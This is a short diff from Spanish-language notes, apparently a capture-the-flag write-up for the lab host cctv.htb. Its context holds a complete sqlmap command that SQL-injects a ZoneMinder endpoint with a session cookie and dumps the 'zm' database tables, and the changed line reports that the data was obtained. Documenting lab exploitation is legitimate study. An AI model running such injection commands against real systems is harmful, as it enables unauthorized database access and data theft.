@@ -41,4 +41,4 @@ Se lo pasaremos a  [[SQLMAP]] junto con las Cookies de session
 sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --dbms=MySQL -D zm --tables --cookie="ZMSESSID=d8r5lphmv7me167dp6hsm1711k" --batch
 ```
 
-Obtenemos los da
+Obtenemos los datos de la base de datos, 
